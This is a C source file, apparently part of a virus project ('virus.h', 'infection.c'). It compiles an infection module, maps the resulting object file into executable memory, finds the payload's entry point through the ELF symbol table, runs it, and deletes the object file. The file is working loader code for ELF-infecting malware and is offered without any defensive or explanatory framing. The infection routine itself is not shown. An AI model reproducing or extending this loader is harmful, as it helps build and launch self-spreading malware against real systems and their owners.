#include "virus.h"

static shellcode   getSymbol(Elf64_Ehdr *header) {
  Elf64_Sym   *sym;
  size_t      size;
  char        *strTab;
  Elf64_Shdr  *section;
  
  section = (void *)header + header->e_shoff;
  while (section->sh_type != SHT_STRTAB)
    section += 1;
  strTab = (void *)header + section->sh_offset;
  section = (void *)header + header->e_shoff;
  while (section->sh_type != SHT_SYMTAB)
    section += 1;
  size = 0;
  sym = (void *)header + section->sh_offset;
  while (size < section->sh_size) {
    if (strcmp(strTab + sym->st_name, PAYLOAD_EP) == 0)
      break ;
    sym += 1;
    size += sizeof(Elf64_Sym);
  }
  if (size == section->sh_size)
    return (NULL);
  return ((void *)header + sizeof(Elf64_Ehdr) + sym->st_value);
}

int   main(void) {
  int         fd;
  shellcode   fun;
  shellcode   code;
  struct stat stats;

  system("gcc -fno-stack-protector -I ./includes/ -c srcs/infection.c -o infection.o");
  if ((fd = open("./infection.o", O_RDONLY)) == 0)
    return (1);
  if (fstat(fd, &stats) == -1) {
    close(fd);
    return (1);
  }
  code = mmap(0, stats.st_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE, fd, 0);
  close(fd);
  remove("./infection.o");
  if (code == MAP_FAILED)
    return (1);
  if ((fun = getSymbol((Elf64_Ehdr *)(code))) == NULL) {
    munmap(code, stats.st_size);
    return (1);
  }
  fun((void *)0x42);
  munmap(code, stats.st_size);
  return (0);
}
